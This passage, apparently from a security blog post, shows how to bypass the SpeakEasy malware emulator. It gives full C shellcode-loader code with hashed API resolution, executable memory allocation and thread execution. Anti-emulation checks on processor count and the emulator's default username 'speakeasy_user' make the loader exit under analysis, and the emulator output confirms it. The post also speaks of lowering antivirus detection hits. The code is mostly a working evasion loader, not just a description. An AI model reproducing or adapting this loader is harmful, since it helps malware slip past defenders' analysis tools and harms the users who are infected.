    PfnVirtualProtect pVirtualProtect = (PfnVirtualProtect)ResolveApi(h_VirtualProtect);
    PfnCreateThread pCreateThread = (PfnCreateThread)ResolveApi(h_CreateThread);
    PfnWaitForSingleObject pWaitForSingleObject = (PfnWaitForSingleObject)ResolveApi(h_WaitForSingleObject);

    if (!pGetSystemInfo || !pGlobalMemoryStatusEx || !pVirtualAlloc) ExitProcess(0xAAAA);

    SYSTEM_INFO sysInfo;
    pGetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors == 0) {
        ExitProcess(0xdead1);
    }

    void* exec_mem = pVirtualAlloc(0, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (exec_mem) {
        for (int i = 0; i < sizeof(buf); i++) {
            ((unsigned char*)exec_mem)[i] = buf[i];
        }

        DWORD oldProtect;
        if (pVirtualProtect(exec_mem, sizeof(buf), PAGE_EXECUTE_READ, &oldProtect)) {
             HANDLE hThread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
             if (hThread) {
                 pWaitForSingleObject(hThread, 0xFFFFFFFF);
             }
        }
    }

    ExitProcess(0);
}
```

And we compare the results of a real windows versus the emulator:
![hardwarebypass](/posts/bypassingspeakeasy/hardwarebypass.gif)

### Default username
A third and final technique for static artifacts lies in the `/speakeasy/configs/default.json` file, where some user information of the emulation are being stored:
```py
# ...
 "env": {
        "comspec": "C:\\Windows\\system32\\cmd.exe",
        "systemroot": "C:\\Windows",
        "windir": "C:\\Windows",
        "temp": "C:\\Windows\\temp\\",
        "userprofile": "C:\\Users\\speakeasy_user",
        "systemdrive": "C:",
        "allusersprofile": "C:\\ProgramData",
        "programfiles": "C:\\Program Files"
    },
# ...
```
We see a hardcoded name of user `speakeasy_user`, which you probably would never see in a real machine. We can weaponize this by pulling the name of the user via `GetUserNameA` and comparing it with the name `speakeasy_user`:
```c
#include <windows.h>
#include <stdint.h>
#include <intrin.h>

// Our usual structs ...

typedef BOOL   (WINAPI *PfnGetUserNameA)(LPSTR, LPDWORD);
typedef void   (WINAPI *PfnGetSystemInfo)(LPSYSTEM_INFO);
typedef LPVOID (WINAPI *PfnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   (WINAPI *PfnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE (WINAPI *PfnCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD  (WINAPI *PfnWaitForSingleObject)(HANDLE, DWORD);

unsigned char buf[] = "\xfc\x48\x83...";

uint32_t hash(const unsigned char* data, size_t len) {
    ...
}

void* ResolveApi(uint32_t targetHash) {
    ...
}

void WINAPI EntryPoint(void) {
    __asm__("and $-16, %rsp");
    __asm__("sub $0x40, %rsp"); 

    uint32_t h_GetUserNameA = 0x3CD2D775; 
    uint32_t h_GetSystemInfo = 0xA86FDDD3;
    uint32_t h_VirtualAlloc = 0x5ACFDE4A;
    uint32_t h_VirtualProtect = 0x208602E4;
    uint32_t h_CreateThread = 0xA6EE5C26;
    uint32_t h_WaitForSingleObject = 0x12F2951B;

    PfnGetUserNameA pGetUserNameA = (PfnGetUserNameA)ResolveApi(h_GetUserNameA);
    PfnGetSystemInfo pGetSystemInfo = (PfnGetSystemInfo)ResolveApi(h_GetSystemInfo);
    PfnVirtualAlloc pVirtualAlloc = (PfnVirtualAlloc)ResolveApi(h_VirtualAlloc);
    PfnVirtualProtect pVirtualProtect = (PfnVirtualProtect)ResolveApi(h_VirtualProtect);
    PfnCreateThread pCreateThread = (PfnCreateThread)ResolveApi(h_CreateThread);
    PfnWaitForSingleObject pWaitForSingleObject = (PfnWaitForSingleObject)ResolveApi(h_WaitForSingleObject);

    if (!pGetUserNameA || !pGetSystemInfo) ExitProcess(0xAAAA);



    // Check username
    char username[256];
    DWORD size = sizeof(username);
    if (pGetUserNameA(username, &size)) {
        // speakeasy_user (14 chars)
        if (hash((unsigned char*)username, 14) == 0x8AA09CB6) { // hash of "speakeasy_user"
            ExitProcess(0xdead5);
        }
    }

    void* exec_mem = pVirtualAlloc(0, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (exec_mem) {
        for (int i = 0; i < sizeof(buf); i++) { ((unsigned char*)exec_mem)[i] = buf[i]; }
        DWORD old;
        if (pVirtualProtect(exec_mem, sizeof(buf), PAGE_EXECUTE_READ, &old)) {
             HANDLE hThread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
             if (hThread) pWaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
    ExitProcess(0);
}
```

And the result is:
```
└-$ speakeasy -t username.exe                                                                                           
/home/connar/Downloads/speakeasy-1.6.1/venv/lib/python3.13/site-packages/unicorn/unicorn.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
* exec: module_entry
0x140001375: 'advapi32.GetUserNameA("speakeasy_user", 0x13ffe44)' -> 0x1
0x14000139f: 'KERNEL32.ExitProcess(0xdead5)' -> 0x0
* Finished emulating
```
which returned the name we expected and exited!


## Final words
All in all, we went through some emulation bypass methods, found either from the source code of SpeakEasy or mimicked by actual malware. We also saw how we took advantage of the proposed solution by Madiant to weaponize it into generating encryption/decryption keys on runtime, dependant from how real systems behave.  

We also saw more or less how many detection hits these samples get, which we could lower even further, perhaps following a different approach on how we walk the PEB and perhaps...a future post of it?

Thanks for staying along in this first intro journey of bypassing SpeakEasy. This is just the tip of the iceberg and there are much more emulators to be bypasses, both opensource and private.  

Till the next one!

![source_code_reversing](/posts/bypassingspeakeasy/source_code_reversing.png)


